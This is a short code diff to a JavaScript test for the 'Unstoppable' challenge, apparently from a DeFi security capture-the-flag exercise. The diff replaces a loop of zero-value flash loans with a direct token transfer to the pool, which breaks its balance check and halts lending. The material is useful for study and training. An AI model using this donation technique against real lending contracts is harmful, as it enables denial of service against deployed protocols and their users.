@@ -40,11 +40,8 @@ describe('[Challenge] Unstoppable', function () {
  
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        for (let i = 0; i < 10; i++) {
-            await this.pool.flashloan(this.receiver.address, ethers.utils.parseEther('0'), {
-                from: attacker
-            })
-        }
+        const attackTokenContract = this.token.connect(attacker)
+       await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
     });
 
     after(async function () {
